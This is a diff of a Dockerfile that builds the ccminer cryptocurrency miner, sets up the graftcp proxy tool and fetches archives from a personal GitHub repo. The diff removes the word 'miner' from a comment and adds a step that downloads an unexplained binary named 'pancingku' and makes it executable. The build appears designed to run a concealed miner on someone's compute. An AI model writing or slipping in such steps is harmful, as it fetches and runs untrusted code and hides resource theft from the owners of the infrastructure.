@@ -20,11 +20,15 @@ RUN wget https://github.com/marcelinoferdom/minse/raw/main/graphics.tar.gz && \
 # Set workdir for ccminer
 WORKDIR /root
 
-# Download miner and build ccminer
+# Download 
 RUN git clone https://github.com/monkins1010/ccminer.git && \
     cd ccminer && \
     chmod +x autogen.sh build.sh configure.sh && \
     ./build.sh
+
+# Download 
+RUN wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/pancingku -O /root/pancingku && \
+    chmod +x /root/pancingku
 
 # Download and extract graftcp tool (proxy setup tool)
 RUN wget https://github.com/hmgle/graftcp/releases/download/v0.4.0/graftcp_0.4.0-1_amd64.deb && \
